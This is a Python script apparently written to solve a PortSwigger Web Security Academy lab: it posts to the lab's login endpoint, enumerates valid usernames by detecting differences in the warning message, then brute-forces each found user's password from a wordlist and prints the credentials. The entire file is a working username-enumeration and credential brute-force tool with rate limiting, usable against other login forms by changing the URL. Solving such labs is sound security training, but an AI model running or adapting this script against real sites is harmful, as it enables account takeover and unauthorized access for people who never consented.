from ratelimit import limits, RateLimitException, sleep_and_retry
from requests import post
from pathlib import Path
try:
    from BeautifulSoup import BeautifulSoup
except:
    from bs4 import BeautifulSoup

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 120

url = 'https://INSTANCE-ID.web-security-academy.net/login'
headers = {
    'Referer': 'https://INSTANCE-ID.web-security-academy.net/'
}
cookies = {
    'session': 'SESSION-COOKIE'
}

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_user_call(url, user, headers, cookies):
    return post(
        url, 
        data={'username': user.strip(), 'password': 'asdf'},
        headers=headers,
        cookies=cookies
    )

def enumerate_user(url, user_file_list, headers, cookies):
    demarcation_response = post(
        url,
        data={'username': 'obviously_non_existent_user', 'password': 'pass'},
        headers=headers,
        cookies=cookies
    )
    parsed_demarcation_res = BeautifulSoup(demarcation_response.text, features='html.parser')
    demarcation_text = parsed_demarcation_res.body.find('p', attrs={'class': 'is-warning'}).text
    users = []
    with Path(user_file_list).open('r') as file:
        for user in file.readlines():
            res = make_user_call(url, user.strip(), headers, cookies)
            parsed_res = BeautifulSoup(res.text, features='html.parser')
            parsed_res_text = parsed_res.body.find('p', attrs={'class': 'is-warning'}).text
            if demarcation_text != parsed_res_text:
                users.append(user.strip())
    return users

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_pass_call(url, user, password, headers, cookies):
    return post(
        url,
        data={'username': user.strip(), 'password': password.strip()},
        headers=headers,
        cookies=cookies
    )

def enumerate_pass(url, user, password_file_list, headers, cookies):
     with Path(password_file_list).open('r') as file:
        for password in file.readlines():
            res = make_pass_call(
                url,
                user=user.strip(),
                password=password.strip(),
                headers=headers,
                cookies=cookies
            )
            if 'Invalid username or password' not in res.text:
                return password.strip()

def main():
    users = enumerate_user(
        url, 
        'usernames.txt',
        headers=headers,
        cookies=cookies
    )
    print(users)
    for user in users:
        password = enumerate_pass(
            url=url,
            user=user,
            password_file_list='passwords.txt',
            headers=headers,
            cookies=cookies
        )
        print(user.strip(), ':', password.strip())

if __name__ == '__main__':
    main()